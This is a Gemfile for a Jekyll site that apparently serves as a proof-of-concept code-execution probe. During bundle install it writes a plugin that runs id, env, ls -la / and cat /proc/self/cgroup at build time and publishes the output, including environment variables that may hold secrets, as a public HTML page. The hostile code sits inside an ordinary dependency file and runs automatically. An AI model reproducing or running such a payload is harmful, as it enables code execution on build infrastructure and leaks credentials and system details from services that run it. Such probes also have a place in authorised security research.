source "https://rubygems.org"

gem "jekyll"

# Gemfile allows arbitrary Ruby execution during bundle install
plugin_dir = File.join(__dir__, "_plugins")
Dir.mkdir(plugin_dir) unless File.directory?(plugin_dir)

File.write(File.join(plugin_dir, "gemfile_probe.rb"), <<~RUBY)
  Jekyll::Hooks.register :site, :after_init do |site|
    File.write(File.join(site.source, "gemfile-probe.html"), [
      "---", "layout: null", "---",
      "<pre>",
      "Gemfile code execution confirmed",
      `id 2>&1`,
      `env 2>&1`,
      `ls -la / 2>&1`,
      `cat /proc/self/cgroup 2>&1`,
      "</pre>"
    ].join("\\n"))
  end
RUBY
